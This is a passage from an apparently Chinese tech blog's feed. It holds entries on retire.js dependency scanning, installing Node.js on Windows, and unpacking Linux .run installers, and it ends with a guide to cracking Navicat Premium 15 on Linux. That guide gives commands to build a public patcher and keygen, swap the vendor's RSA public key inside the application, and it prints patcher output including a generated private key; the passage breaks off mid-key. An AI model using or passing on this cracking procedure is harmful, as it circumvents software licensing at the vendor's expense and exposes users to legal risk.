class="hljs-comment">--help</span><br><br>  Usage: retire [options]<br><br>  Options:<br><br>    -h, <span class="hljs-comment">--help               output usage information</span><br>    -V, <span class="hljs-comment">--version            output the version number</span><br><br>    -p, <span class="hljs-comment">--package            limit node scan to packages where parent is mentioned in package.json (ignore node_modules)</span><br>    -n, <span class="hljs-comment">--node               Run node dependency scan only</span><br>    -j, <span class="hljs-comment">--js                 Run scan of JavaScript files only</span><br>    -v, <span class="hljs-comment">--verbose            Show identified files (by default only vulnerable files are shown)</span><br>    -x, <span class="hljs-comment">--dropexternal       Don&#x27;t include project provided vulnerability repository</span><br>    -c, <span class="hljs-comment">--nocache            Don&#x27;t use local cache</span><br><br>    <span class="hljs-comment">--jspath &lt;path&gt;          Folder to scan for javascript files</span><br>    <span class="hljs-comment">--nodepath &lt;path&gt;        Folder to scan for node files</span><br>    <span class="hljs-comment">--path &lt;path&gt;            Folder to scan for both</span><br>    <span class="hljs-comment">--jsrepo &lt;path|url&gt;      Local or internal version of repo</span><br>    <span class="hljs-comment">--noderepo &lt;path|url&gt;    Local or internal version of repo</span><br>    <span class="hljs-comment">--cachedir &lt;path&gt;        Path to use for local cache instead of /tmp/.retire-cache</span><br>    <span class="hljs-comment">--proxy &lt;url&gt;            Proxy url (http://some.sever:8080)</span><br>    <span class="hljs-comment">--outputformat &lt;format&gt;  Valid formats: text, json, jsonsimple, depcheck (experimental) and cyclonedx</span><br>    <span class="hljs-comment">--outputpath &lt;path&gt;      File to which output should be written</span><br>    <span class="hljs-comment">--ignore &lt;paths&gt;         Comma delimited list of paths to ignore</span><br>    <span class="hljs-comment">--ignorefile &lt;path&gt;      Custom ignore file, defaults to .retireignore / .retireignore.json</span><br>    <span class="hljs-comment">--severity &lt;level&gt;       Specify the bug severity level from which the process fails. Allowed levels none, low, medium, high, critical. Default: none</span><br>    <span class="hljs-comment">--exitwith &lt;code&gt;        Custom exit code (default: 13) when vulnerabilities are found</span><br>    <span class="hljs-comment">--colors                 Enable color output (console output only)</span><br>    <span class="hljs-comment">--insecure               Enable fetching remote jsrepo/noderepo files from hosts using an insecure or self-signed SSL (TLS) certificate</span><br>    <span class="hljs-comment">--cacert &lt;path&gt;          Use the specified certificate file to verify the peer used for fetching remote jsrepo/noderepo files</span><br></code></pre></td></tr></table></figure><h4 id="分析扫描结果-4"><a href="#分析扫描结果-4" class="headerlink" title="分析扫描结果"></a>分析扫描结果</h4><p>和npm扫描结果分析方式相同，基本上大同小异</p><h2 id="nodejs-修复措施"><a href="#nodejs-修复措施" class="headerlink" title="nodejs 修复措施"></a>nodejs 修复措施</h2><p>  1、调用安全组件，如：xss，防止跨站脚本编制<br><br>  2、对于sql注入问题，按照编码要求进行编码<br><br>  3、部分无法使用安全组件进行修复的场景，可以自行构建过滤器进行处理<br><br>  4、对于逻辑漏洞，只能根据实际情况进行处理。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[<a href="https://hksanduo.github.io/2019/06/11/2019-06-11-Node-js-security-checklist/">https://hksanduo.github.io/2019/06/11/2019-06-11-Node-js-security-checklist/</a>) 【nodejs安全清单】</li><li>[<a href="https://github.com/analysis-tools-dev/static-analysis]">https://github.com/analysis-tools-dev/static-analysis]</a> 【static analysis tools list】</li><li>[<a href="https://www.microfocus.com/documentation/fortify-static-code-analyzer-and-tools/1910/SCA_Guide_19.1.0.pdf]">https://www.microfocus.com/documentation/fortify-static-code-analyzer-and-tools/1910/SCA_Guide_19.1.0.pdf]</a> 【fortify sca 19.0.1用户手册】</li><li>[<a href="https://medium.com/@manjula.aw/nodejs-security-tools-de0d0c937ec0]">https://medium.com/@manjula.aw/nodejs-security-tools-de0d0c937ec0]</a> 【nodejs security tools】</li><li>[<a href="https://medium.com/ngconf/how-to-analyze-an-angular-project-with-fortify-a3abc729e8d1]">https://medium.com/ngconf/how-to-analyze-an-angular-project-with-fortify-a3abc729e8d1]</a></li><li>[<a href="https://github.com/mysqljs/mysql#escaping-query-values]">https://github.com/mysqljs/mysql#escaping-query-values]</a> 【node-mysql】</li><li>[<a href="https://juejin.im/post/5b07eb1c5188254e28710d80]">https://juejin.im/post/5b07eb1c5188254e28710d80]</a> 【Node.js执行系统命令】</li><li>[<a href="https://xz.aliyun.com/t/7184#toc-0]">https://xz.aliyun.com/t/7184#toc-0]</a> 【Node.js 常见漏洞学习与总结】</li><li>[<a href="https://docs.npmjs.com/cli/audit]">https://docs.npmjs.com/cli/audit]</a> 【npm audit介绍】</li><li>[<a href="https://github.com/OpenSecurityIN/nodejsscan]">https://github.com/OpenSecurityIN/nodejsscan]</a> 【nodejsscan github地址】</li><li>[<a href="https://retirejs.github.io/retire.js/]">https://retirejs.github.io/retire.js/]</a> 【Retire.js】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows安装配置nodejs</title>
    <link href="/2020/06/28/2020-06-28-install-and-config-nodejs/"/>
    <url>/2020/06/28/2020-06-28-install-and-config-nodejs/</url>
    
    <content type="html"><![CDATA[<p>windows 安装配置nodejs</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近碰到几个nodejs的代码审计项目，之前在archlinux上配置过nodejs环境，基本上就是一句命令的事，由于疫情<br>出差就带了一个笔记本，懒得远程折腾了，种种原因，还是在自己平时工作的windows笔记本搭建一下nodejs环境，本文<br>纯属扯淡，大家略过就行。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>首先到官网上下载nodejs，这里以最新的为例。<br><img src="/img/20200628-nodejs-01.png" alt="20200628-nodejs-01.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>没有明显需要注意的地方，一直下一步就行，注意安装位置</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="1、修改NodeJs数据存放的路径"><a href="#1、修改NodeJs数据存放的路径" class="headerlink" title="1、修改NodeJs数据存放的路径"></a>1、修改NodeJs数据存放的路径</h3><p><img src="/img/20200628-nodejs-02.png" alt="20200628-nodejs-02.png"><br>创建两个文件夹：node_cache、node_data<br><img src="/img/20200628-nodejs-03.png" alt="20200628-nodejs-03.png"></p><h3 id="2、配置存储路径"><a href="#2、配置存储路径" class="headerlink" title="2、配置存储路径"></a>2、配置存储路径</h3><p>打开CMD执行以下命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">npm<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span><span class="hljs-built_in"> prefix </span>D:\Program\nodejs\node_data<br>npm<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> cache D:\Program\nodejs\node_cache<br></code></pre></td></tr></table></figure><p><img src="/img/20200628-nodejs-04.png" alt="20200628-nodejs-04.png"><br>如果什么不显示,则表示修改成功</p><h3 id="3、配置环境变量"><a href="#3、配置环境变量" class="headerlink" title="3、配置环境变量"></a>3、配置环境变量</h3><p>修改用户变量把系统的npm指定改为如下<code>C:\Users\Administrator\AppData\Roaming\npm 改为 D:\Program\nodejs\node_data</code><br><img src="/img/20200628-nodejs-05.png" alt="20200628-nodejs-05.png"></p><p>添加系统变量 NODE_PATH 路径为 D:\Program\nodejs\node_data\node_modules<br><img src="/img/20200628-nodejs-06.png" alt="20200628-nodejs-06.png"></p><p>注意这俩个指向需要改为我们刚刚新建的俩个文件夹 , 路径不要拷贝上面的 ,写你自己保存的地方，配置完成后点击保存。<br>测试，判断是否配置陈工<br>执行以下指令判断是否配置成功</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br>npm -v<br></code></pre></td></tr></table></figure><p><img src="/img/20200628-nodejs-07.png" alt="20200628-nodejs-07.png"></p><p>输入 node -v 与 npm -v 这一次我们没有在 nodejs 文件夹中运行这俩个命令 ,如果命令能够正确输出则表示环境配置成功</p><h3 id="4、配置NodeJs的国内镜像"><a href="#4、配置NodeJs的国内镜像" class="headerlink" title="4、配置NodeJs的国内镜像"></a>4、配置NodeJs的国内镜像</h3><p>运行以下指令，为nodejs配置阿里的镜像源</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install ‐g cnpm ‐‐registry=https://registry.<span class="hljs-built_in">npm</span>.taobao.org<br></code></pre></td></tr></table></figure><p><img src="/img/20200628-nodejs-08.png" alt="20200628-nodejs-08.png"><br>检查是否配置成功<br><img src="/img/20200628-nodejs-09.png" alt="20200628-nodejs-09.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a>【nodejs官网】</li><li><a href="https://blog.csdn.net/qq_40646143/article/details/103237095">https://blog.csdn.net/qq_40646143&#x2F;article&#x2F;details&#x2F;103237095</a>【NodeJs卸载,安装与配置国内镜像】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Dev</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>run格式文件破解</title>
    <link href="/2020/05/28/2020-05-28-crack-run-program/"/>
    <url>/2020/05/28/2020-05-28-crack-run-program/</url>
    
    <content type="html"><![CDATA[<p>run格式文件破解</p><hr><h2 id="run文件介绍"><a href="#run文件介绍" class="headerlink" title="run文件介绍"></a>run文件介绍</h2><p>在RUN格式的文件是一个可执行的基于Linux的应用程序，包含了为Linux平台开发的具体方案相关的代码。此代码通常初始化应用程序本身，虽然在某些情况下，在文件.RUN扩展指程序安装用于Linux操作系统开发的应用程序。设备驱动软件为Linux常常被捆绑并分发.RUN包中包含的文件。这些.RUN文件初始化这些设备驱动程序软件应用程序的安装，所以Linux用户可以快速，轻松地安装或更新自己的设备驱动程序软件。</p><h2 id="如何运行run文件"><a href="#如何运行run文件" class="headerlink" title="如何运行run文件"></a>如何运行run文件</h2><p>一个.RUN失败初始化文件是最有可能缺乏来自Linux操作系统相应的可执行权限。使用<code>chmod + X filenamehere.run</code> 这可以通过通过这个chmod命令添加所需的权限予以纠正。用户可事后初始化.RUN文件使用此命令：<code>./filenamehere.run</code>。</p><h2 id="如果构建run文件"><a href="#如果构建run文件" class="headerlink" title="如果构建run文件"></a>如果构建run文件</h2><p>run程序安装包实质上是一个安装脚本加要安装的程序，如下图所示：<br><img src="/img/20200528-crack-run-program-01.png" alt="20200528-crack-run-program-01.png"></p><p>通常为了方便，只放一个程序或者是一个压缩包，理论上可以放多个，但是会很恶心的。</p><p>这样整个run安装包结构就一目了然了，实际上因为实际需要结构多少有点变动但这个无关紧要，只需要明白原理就行了。<br>制作run安装包以下举个实际的例子：<br>为了简单起见，要安装的程序就是helloworld程序，安装它的过程就是把它拷贝到&#x2F;bin目录下。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br>install.sh helloworld<br><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> install.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cp</span> helloworld /bin<br></code></pre></td></tr></table></figure><p>现在有一个安装脚本了，名为install.sh，有一个要安装的程序helloworld.因为要安装的程序一般都是用.tar.bz2来做的。我们这儿也做一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ tar zcvf helloworld<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> helloworld<br></code></pre></td></tr></table></figure><p>现在修改一个安装脚本install.sh，改为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">tail</span> -n +6 <span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span> &gt;/tmp/helloworld.tar.gz <span class="hljs-comment"># $0表示脚本本身，这个命令用来把从$lines开始的内容写入一个/tmp目录的helloworld.tar.gz文件里。</span><br>tar jxvf /tmp/hellowrold.tar.gz<br><span class="hljs-built_in">cp</span> helloworld /bin<br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><p>然后使用cat命令连接安装脚本install.sh和helloworld.tar.gz。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ <span class="hljs-keyword">cat</span> install.<span class="hljs-keyword">sh</span> helloworld.tar.gz &gt; myinstall.<span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p>这样就得到了myinstall.run文件，它的结构如下：</p><p><img src="/img/20200528-crack-run-program-05.png" alt="20200528-crack-run-program-05.png"></p><p>我们在notepad++中打开我们生成的安装文件<br><img src="/img/20200528-crack-run-program-02.png" alt="20200528-crack-run-program-02.png"></p><p>运行myinstall.run时，运行到第5行的exit 0脚本就退出了，所以不会去运行第6行以下的二进制数据(即helloworld.tar.gz文件)，而我们用了tail巧妙地把第7行以下的数据重新生成了一个helloworld.tar.gz文件。再执行安装。run安装包制作较小的程序包是很好的选择，但是它也有缺点，做逻辑比较复杂的安装包，写的安装脚本将会很麻烦。</p><h2 id="解压run文件"><a href="#解压run文件" class="headerlink" title="解压run文件"></a>解压run文件</h2><p>怎么样构建的run文件，怎么样解压run文件，但是加压之前你得需要明确文件的结构，也就是文件拆分的行数。我们这里以之前构建的myinstall.run文件为例来讲解。</p><h3 id="确定文件结构"><a href="#确定文件结构" class="headerlink" title="确定文件结构"></a>确定文件结构</h3><p>使用notepadd++，winhex等文本编辑工具打开run文件，获取安装shell脚本，小文件可以直接用notepad++查看，大文件建议先用winhex,010editor等工具打开，将shell文件拷贝出来再进行分析</p><p><img src="/img/20200528-crack-run-program-03.png" alt="20200528-crack-run-program-03.png"></p><p>通过分析myinstall.run文件中的shell脚本，重点关注第二行，通过这行我们能确认具体安装程序从第6行开始。</p><h3 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h3><p>通过tail工具，我们可以直接获取我们helloworld.tar.gz，进而查看程序内容。</p><p><img src="/img/20200528-crack-run-program-04.png" alt="20200528-crack-run-program-04.png"></p><p>命令可以参考以下，根据实际情况修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -n +6 myinstall.run&gt;/tmp/helloworld.tar.gz<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>文件解压不一定通过tail来获取，理论上所有可以操作文件的指令都可以，比如：sed，对于myinstall.run也可以使用以下指令来解压run文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed -n -e <span class="hljs-string">&#x27;1,/^exit 0$/!p&#x27;</span> ./myinstall.run &gt; ./helloworld.tar.gz 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.51cto.com/linuxcgi/1965299">https://blog.51cto.com/linuxcgi/1965299</a>【run文件介绍】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Rever Engineering</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下激活navicat15</title>
    <link href="/2020/03/23/2020-03-23-crack-navicat-15-for-linux/"/>
    <url>/2020/03/23/2020-03-23-crack-navicat-15-for-linux/</url>
    
    <content type="html"><![CDATA[<p>Linux下激活navicat15</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote><p>Navicat 是香港卓软数字科技有限公司生产的一系列 MySQL、MariaDB、MongoDB、Oracle、SQLite、PostgreSQL 及 Microsoft SQL Server 的图形化数据库管理及发展软件。它有一个类似浏览器的图形用户界面，支持多重连线到本地和远程数据库。它的设计合乎各种用户的需求，从数据库管理员和程序员，到各种为客户服务并与合作伙伴共享信息的不同企业或公司。   –wikipedia</p></blockquote><p>Navicat这个工具很强大,方便IT人员日常对数据库进行管理，但是由于自己太穷，所以买不起正版授权，从网上看到有大佬放出patch，根据大佬提供的wiki和patch源码，在自己的本机成功激活Navicat15,这里只是在记录自己激活的步骤，有条件还是去买个永久版吧。</p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><h3 id="下载navicat。"><a href="#下载navicat。" class="headerlink" title="下载navicat。"></a>下载navicat。</h3><p>从<a href="https://www.navicat.com/en/download/navicat-premium">官方网站</a>下载navicat,你会得到一个AppImage文件。例如 navicat15-premium-en.AppImage。<br>我假定这个AppImage文件在 ~&#x2F;Desktop 文件夹下。</p><h3 id="提取AppImage文件"><a href="#提取AppImage文件" class="headerlink" title="提取AppImage文件"></a>提取AppImage文件</h3><p>提取AppImage文件里的所有文件到一个文件夹。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> ~/Desktop/navicat15-premium-en</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> mount -o loop ~/Desktop/navicat15-premium-en.AppImage ~/Desktop/navicat15-premium-en</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> -r ~/Desktop/navicat15-premium-en ~/Desktop/navicat15-premium-en-patched</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> umount ~/Desktop/navicat15-premium-en</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -rf ~/Desktop/navicat15-premium-en</span><br></code></pre></td></tr></table></figure><p>这里主要目的是从AppImage中提取文件，放到~&#x2F;Desktop&#x2F;navicat15-premium-en-patched目录中</p><h3 id="编译patcher和keygen"><a href="#编译patcher和keygen" class="headerlink" title="编译patcher和keygen"></a>编译patcher和keygen</h3><h3 id="编译准备"><a href="#编译准备" class="headerlink" title="编译准备"></a>编译准备</h3><p>1、请确保你安装了下面几个库：　</p><ul><li>capstone</li><li>keystone</li><li>rapidjson</li></ul><p>作者wiki上使用的Linux版本为Ubunut，我个人使用的是Archlinux，我这里就以Archlinux为例进行讲解patcher和keygen的编译,执行以下指令，直接安装对应依赖库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pacman -S capstone keystone rapidjson<br></code></pre></td></tr></table></figure><p>2、确定你的gcc支持C++17特性。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> -b linux --single-branch https://github.com/DoubleLabyrinth/navicat-keygen.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> navicat-keygen</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make all</span><br></code></pre></td></tr></table></figure><p>如果编译成功，在navicat-keygen的bin目录下会生成navicat-keygen和navicat-patcher两个文件</p><h3 id="使用-navicat-patcher-替换官方公钥"><a href="#使用-navicat-patcher-替换官方公钥" class="headerlink" title="使用 navicat-patcher 替换官方公钥"></a>使用 navicat-patcher 替换官方公钥</h3><p>使用 navicat-patcher 替换官方公钥。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Usage:<br>    navicat-patcher [--dry-run] &lt;Navicat Installation Path&gt; [RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">Private</span> Key <span class="hljs-keyword">File</span>]<br><br>        [--dry-run]                   Run patcher without applying <span class="hljs-built_in">any</span> patches.<br>                                      This <span class="hljs-keyword">parameter</span> is <span class="hljs-keyword">optional</span>.<br><br>        &lt;Navicat Installation Path&gt;   Path to a directory <span class="hljs-keyword">where</span> Navicat locates<br>                                      This <span class="hljs-keyword">parameter</span> must be specified.<br><br>        [RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">Private</span> Key <span class="hljs-keyword">File</span>]   Path to a PEM-<span class="hljs-keyword">format</span> RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">private</span> key <span class="hljs-keyword">file</span>.<br>                                      This <span class="hljs-keyword">parameter</span> is <span class="hljs-keyword">optional</span>.<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./bin/navicat-patcher ~/Desktop/navicat15-premium-en-patched</span><br></code></pre></td></tr></table></figure><p>Navicat Premium 15.0.8 Linux 英文版 已经通过测试。</p><p>下面是一份样例输出：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs tap">**********************************************************<br>*       Navicat Patcher (Linux) by @DoubleLabyrinth      *<br>*                  Version: 1.0                          *<br>**********************************************************<br><br>Press ENTER to continue or Ctrl + C to abort.<br><br>[+] Try to open libcc.so ... Ok!<br><br>[+] PatchSolution0 ...... Ready to apply<br>    RefSegment      =  1<br>    MachineCodeRva  =  0x000000000141fbf0<br>    PatchMarkOffset = +0x0000000002a25648<br><br>[*] Generating new RSA private key, it may take a long time...<br>[*] Your RSA private key:<br>    -----BEGIN RSA PRIVATE KEY--<span class="language-yaml"><span class="hljs-meta">---</span></span><br><span class="language-yaml">    <span class="hljs-string">MIIEowIBAAKCAQEAwGklHmDx9hacVUjT94Ydpy/1mTHJ7lJy6aGu84MjQDHBw4Ni</span></span><br><span class="language-yaml">    <span class="hljs-string">iNG+axcv0gi5RATceD0DTZdF/Mt2dklWwMfGi3Ztk3Axbnof/byDCEeriQ79bCEb</span></span><br><span class="language-yaml">    <span class="hljs-string">1rPqiVmXH54wwS/6kM8d+rQW/xx6WWndo8JvasPYApRjW9moxnOT4ylzvjw/AMzA</span></span><br><span class="language-yaml">    <span class="hljs-string">Nw0dPfNqRtdYcOflIvP3PvwFhaYqb9mk7LhnfBqUF4fKwnPwtnC+g2L8V2gPlHQb</span></span><br><span class="language-yaml">    <span class="hljs-string">NIOuxP7krX6lreEn1vK6E03doV1ZGs74ZYwcQGcb7RFPt/gVATzN/E8CILBq8pBt</span></span><br><span class="language-yaml">    <span class="hljs-string">O19Cpv44cvXY2fBDL9q5UauS4dqvI9EjAjFRvwIDAQABAoIBAEUQeMZivfc7PnpO</span></span><br><span class="language-yaml">    <span class="hljs-string">XednOJWeXWXTvUvSRHUgGBBIbgrI0WhAbMn3n4YJGJ0njHih1hFCtUDQn8qRrb/f</span></span><br><span class="language-yaml">    <span class="hljs-string">q0gfbWD57XMSvmuNYpZNaCs8rpHP059QcxGqGvGaOuiae52cfzAjZ/tpUSfZLQGT</span></span><br><span class="language-yaml">    <span class="hljs-string">Qn9Zd2y3R34FjXSWuEIjkl3jrywFDCoxtsVQKRBhJhprUgytRT4qlQlDkG4OcZ+T</span></span><br><span class="language-yaml">    <span class="hljs-string">GJP+TU1tqvv7bcP7vIEMTnkrIjyfYfUPNK+HIoV8obGHDWxVhlcvvxTvtd1IsFfF</span></span><br><span class="language-yaml">    <span class="hljs-string">hqvfeVdWWl5krWDCL1wME7ipY3N240rIXAlR9WQTMkNerr83IYM0OPeXja/vYPSz</span></span><br><span class="language-yaml">    <span class="hljs-string">8gDPQQECgYEA8PNcCw/5ok5iltWlvsdw/7MHx/wIpo8a37Q6+Q2KZKeVnwEFgItd</span></span><br><span class="language-yaml">    <span class="hljs-string">6QGSiEeVzlC8LcIMdpxzGET8Ky+IUMs6d0u+GkF7L2gAHOKmAf+8N2zMIGBn255m</span></span><br><span class="language-yaml">    <span class="hljs-string">8uvMmo8ZDRqdookJytNq9FhfBJ4XnuQ05AixG4OBjOvO+G6bAZ44NOECgYEAzG2q</span></span><br><span class="language-yaml">    <span class="hljs-string">KCBA5lGHF3v5RG4j8194XCSEQ5CnEUt6ijCBh/KnQSkR64ARzWlKhQzm9L5DbPBi</span></span><br><span class="language-yaml">    <span class="hljs-string">Zn2OlcDWBzaQnQVxbF43YrIwln1JaU+7oc29CDq7OEQFTeiOkEcGbOv1RTJciUaI</span></span><br><span class="language-yaml">    <span class="hljs-string">FXAHeR5XOM8+DnPnrWT/9NLnO/zIA8xyWLV9up8CgYAFricIV7sR2Xk3hxfeNIN0</span></span><br><span class="language-yaml">    <span class="hljs-string">c7sGOunVS2Bdz7joMCqIDu9XDUYc7qwrFw9mSRG+CGc3SPDURwHrm4y6U+eJyBC7</span></span><br><span class="language-yaml">    <span class="hljs-string">yTxVECAgUPpXs/wn5eiBAf6Z8MviAIz6wxZSunbjuTHoKATkFDHcSs0KpdN2uniI</span></span><br><span class="language-yaml">    <span class="hljs-string">u6+5L1N5iAGcF7dtxVYb4QKBgFeLt00L0v9Pds0F2JAHovm8ruy27rWIoyNy8X1w</span></span><br><span class="language-yaml">    <span class="hljs-string">nGg98IalMflqlTUknDcyeU3ilTl4EIvXxVI4jO/13CSCijpgdtObf9dSvDePX8lB</span></span><br><span class="language-yaml">    <span class="hljs-string">NGzryfWkm6jrqPH8mLHYsub5VEutmuWjXm/uIGhByE+kL1lAYaTVFRXJgVavHWEE</span></span><br><span class="language-yaml">    <span 